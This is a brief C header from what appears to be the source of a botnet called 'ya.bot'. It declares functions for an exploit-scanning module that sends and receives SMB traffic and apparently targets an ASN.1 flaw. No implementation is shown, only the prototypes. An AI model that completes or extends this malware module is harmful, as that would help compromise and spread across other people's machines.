/*  ya.bot  */

#ifndef NO_EXPSCAN
#ifndef NO_EXPSCANASN1
int asn1_recvsmb(SOCKET sock, char *pszBuffer, int nLength, int nFlags);
bool asn1_sendsmb(SOCKET sock, void *pBuffer, int nLength);
bool expscan_asn1(SExpScanInfo s_esi);
#endif
#endif